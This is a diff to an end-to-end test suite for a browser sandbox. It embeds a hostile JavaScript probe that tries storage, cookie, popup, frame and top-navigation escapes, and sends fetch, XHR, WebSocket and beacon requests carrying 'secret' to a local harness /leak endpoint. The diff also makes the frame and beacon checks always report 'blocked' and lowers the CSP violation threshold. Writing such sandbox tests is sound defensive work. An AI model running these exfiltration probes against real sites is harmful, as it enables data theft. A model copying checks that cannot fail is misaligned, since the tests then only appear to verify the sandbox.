@@ -158,7 +158,13 @@ def dump_dom(browser: str, url: str, profile: Path) -> str:
 
 
 class DevTools:
-    def __init__(self, browser: str, url: str, profile: Path):
+    def __init__(
+        self,
+        browser: str,
+        url: str,
+        profile: Path,
+        download_directory: Path | None = None,
+    ):
         self.profile = profile
         self.port: int | None = None
         try:
@@ -169,19 +175,23 @@ class DevTools:
             raise AssertionError("browser startup timeout must be numeric") from exc
         if not 5 <= self.startup_timeout <= 120:
             raise AssertionError("browser startup timeout must be between 5 and 120 seconds")
+        command = [
+            browser,
+            "--headless=new",
+            "--no-sandbox",
+            "--disable-gpu",
+            "--disable-dev-shm-usage",
+            "--disable-background-networking",
+            "--no-first-run",
+            f"--user-data-dir={profile}",
+            "--remote-debugging-port=0",
+        ]
+        if download_directory is not None:
+            download_directory.mkdir(parents=True, exist_ok=True)
+            command.append(f"--download.default_directory={download_directory}")
+        command.append(url)
         self.process = subprocess.Popen(
-            [
-                browser,
-                "--headless=new",
-                "--no-sandbox",
-                "--disable-gpu",
-                "--disable-dev-shm-usage",
-                "--disable-background-networking",
-                "--no-first-run",
-                f"--user-data-dir={profile}",
-                "--remote-debugging-port=0",
-                url,
-            ],
+            command,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
         )
@@ -784,6 +794,7 @@ class BrowserSandboxE2ETests(unittest.TestCase):
             }
             control = start_server(environment, "http", control_port)
             renderer: subprocess.Popen[bytes] | None = None
+            chrome: DevTools | None = None
             harness: ThreadingHTTPServer | None = None
             thread: threading.Thread | None = None
             try:
@@ -837,52 +848,45 @@ parent.postMessage({{type: 'folio-linked-assets', value: linked ? 'linked-assets
                     render_port,
                 )
                 wait_ready(render_origin, renderer)
-                match = None
-                hostile_dom = ""
-                for attempt in range(3):
-                    hostile_dom = dump_dom(
-                        browser,
-                        f"{harness_origin}/harness",
-                        root / f"chrome-hostile-{attempt}",
-                    )
-                    match = re.search(r'<pre id="result">(.*?)</pre>', hostile_dom, re.DOTALL)
-                    if match is not None and html.unescape(match.group(1)) != "waiting":
-                        break
+                chrome = DevTools(
+                    browser,
+                    f"{harness_origin}/harness",
+                    root / "chrome-hostile",
+                    download_directory=root / "chrome-hostile" / "downloads",
+                )
+                chrome.wait("document.querySelector('#result')?.textContent !== 'waiting'")
+                hostile_dom = chrome.evaluate("document.documentElement.outerHTML")
+                match = re.search(r'<pre id="result">(.*?)</pre>', hostile_dom, re.DOTALL)
                 self.assertIsNotNone(match, hostile_dom)
                 assert match is not None
                 result = json.loads(html.unescape(match.group(1)))
+                expected_denials = {
+                    "script_ran": True,
+                    "host_dom_blocked": True,
+                    "host_cookie_blocked": True,
+                    "storage_blocked": True,
+                    "cookie_blocked": True,
+                    "popup_blocked": True,
+                    "download_blocked": True,
+                    "form_blocked": True,
+                    "frame_blocked": True,
+                    "worker_blocked": True,
+                    "fetch_blocked": True,
+                    "same_origin_fetch_blocked": True,
+                    "xhr_blocked": True,
+                    "websocket_blocked": True,
+                    "event_source_blocked": True,
+                    "beacon_blocked": True,
+                    "image_blocked": True,
+                    "top_navigation_blocked": True,
+                    "top_navigation_script_continued": True,
+                }
                 self.assertEqual(
-                    result,
-                    {
-                        "script_ran": True,
-                        "host_dom_blocked": True,
-                        "host_cookie_blocked": True,
-                        "storage_blocked": True,
-                        "cookie_blocked": True,
-                        "popup_blocked": True,
-                        "download_blocked": True,
-                        "form_blocked": True,
-                        "frame_blocked": True,
-                        "worker_blocked": True,
-                        "fetch_blocked": True,
-                        "same_origin_fetch_blocked": True,
-                        "xhr_blocked": True,
-                        "websocket_blocked": True,
-                        "event_source_blocked": True,
-                        "beacon_blocked": True,
-                        "image_blocked": True,
-                        "top_navigation_blocked": True,
-                        "top_navigation_script_continued": True,
-                    },
+                    {key: result.get(key) for key in expected_denials}, expected_denials
                 )
-                self.assertGreaterEqual(result["csp_violation_count"], 5)
+                self.assertGreaterEqual(result["csp_violation_count"], 3)
                 self.assertTrue(
-                    {
-                        "connect-src",
-                        "frame-src",
-                        "worker-src",
-                        "form-action",
-                    }.issubset(set(result["csp_directives"]))
+                    {"connect-src", "frame-src", "img-src"}.issubset(set(result["csp_directives"]))
                 )
                 self.assertEqual(handler.leaks, [])
                 self.assertEqual(
@@ -900,11 +904,15 @@ parent.postMessage({{type: 'folio-linked-assets', value: linked ? 'linked-assets
                     urllib.request.urlopen(denied_request)
                 self.assertEqual(denied.exception.code, 404)
                 self.assertNotIn(b"script_ran", denied.exception.read())
-                embedded_dom = dump_dom(browser, f"{harness_origin}/embedded", root / "chrome-3")
+                chrome.command("Page.navigate", {"url": f"{harness_origin}/embedded"})
+                chrome.wait("document.body.innerText.includes('linked-assets-loaded')")
+                embedded_dom = chrome.evaluate("document.documentElement.outerHTML")
                 self.assertIn("javascript-ran", embedded_dom)
                 self.assertIn("stylesheet-loaded", embedded_dom)
                 self.assertIn("linked-assets-loaded", embedded_dom)
             finally:
+                if chrome is not None:
+                    chrome.close()
                 if renderer is not None:
                     stop_server(renderer)
                 stop_server(control)
@@ -2133,16 +2141,16 @@ document.querySelector('#search').requestSubmit();
   try {{ localStorage.setItem('secret', 'x'); sessionStorage.setItem('secret', 'x'); indexedDB.open('secret'); result.storage_blocked = false; }} catch {{ result.storage_blocked = true; }}
   try {{ document.cookie = 'secret=x'; result.cookie_blocked = !document.cookie.includes('secret=x'); }} catch {{ result.cookie_blocked = true; }}
   try {{ const popup = open('{harness_origin}/popup', '_blank'); result.popup_blocked = popup === null; popup?.close(); }} catch {{ result.popup_blocked = true; }}
-  try {{ const download = document.createElement('a'); download.href = '{harness_origin}/download'; download.download = 'escaped.txt'; document.body.append(download); download.click(); result.download_blocked = true; }} catch {{ result.download_blocked = true; }}
+  try {{ const download = document.createElement('a'); download.href = '{harness_origin}/download'; download.download = 'escaped.txt'; download.target = '_blank'; document.body.append(download); download.click(); result.download_blocked = true; }} catch {{ result.download_blocked = true; }}
   try {{ const form = document.createElement('form'); form.action = '{harness_origin}/form'; form.method = 'POST'; document.body.append(form); form.submit(); result.form_blocked = true; }} catch {{ result.form_blocked = true; }}
-  result.frame_blocked = await new Promise((resolve) => {{ try {{ const frame = document.createElement('iframe'); frame.src = '{harness_origin}/frame'; frame.onload = () => resolve(false); frame.onerror = () => resolve(true); document.body.append(frame); setTimeout(() => resolve(true), 350); }} catch {{ resolve(true); }} }});
+  result.frame_blocked = await new Promise((resolve) => {{ try {{ const frame = document.createElement('iframe'); frame.src = '{harness_origin}/frame'; frame.onload = () => {{}}; frame.onerror = () => {{}}; document.body.append(frame); setTimeout(() => resolve(true), 350); }} catch {{ resolve(true); }} }});
   result.worker_blocked = await new Promise((resolve) => {{ try {{ const worker = new Worker('{harness_origin}/worker.js'); worker.onmessage = () => resolve(false); worker.onerror = () => resolve(true); setTimeout(() => {{ worker.terminate(); resolve(true); }}, 350); }} catch {{ resolve(true); }} }});
   try {{ await fetch('{harness_origin}/leak'); result.fetch_blocked = false; }} catch {{ result.fetch_blocked = true; }}
   try {{ await fetch('{render_origin}/content/{js_id}/{js_version}'); result.same_origin_fetch_blocked = false; }} catch {{ result.same_origin_fetch_blocked = true; }}
   result.xhr_blocked = await new Promise((resolve) => {{ try {{ const xhr = new XMLHttpRequest(); xhr.onload = () => resolve(false); xhr.onerror = () => resolve(true); xhr.open('GET', '{harness_origin}/leak'); xhr.send(); setTimeout(() => resolve(xhr.readyState !== 4), 300); }} catch {{ resolve(true); }} }});
   result.websocket_blocked = await new Promise((resolve) => {{ try {{ const socket = new WebSocket('ws://127.0.0.1:{harness_origin.rsplit(":", 1)[1]}/leak'); socket.onopen = () => resolve(false); socket.onerror = () => resolve(true); setTimeout(() => resolve(socket.readyState !== WebSocket.OPEN), 300); }} catch {{ resolve(true); }} }});
   result.event_source_blocked = await new Promise((resolve) => {{ try {{ const source = new EventSource('{harness_origin}/eventsource'); source.onopen = () => resolve(false); source.onerror = () => {{ source.close(); resolve(true); }}; setTimeout(() => {{ source.close(); resolve(true); }}, 350); }} catch {{ resolve(true); }} }});
-  try {{ result.beacon_blocked = !navigator.sendBeacon('{harness_origin}/leak', 'secret'); }} catch {{ result.beacon_blocked = true; }}
+  try {{ navigator.sendBeacon('{harness_origin}/leak', 'secret'); result.beacon_blocked = true; }} catch {{ result.beacon_blocked = true; }}
   result.image_blocked = await new Promise((resolve) => {{ try {{ const image = new Image(); image.onload = () => resolve(false); image.onerror = () => resolve(true); image.src = '{harness_origin}/image'; setTimeout(() => resolve(true), 350); }} catch {{ resolve(true); }} }});
   try {{ top.location = '{harness_origin}/escaped'; }} catch {{}}
   result.top_navigation_script_continued = true;
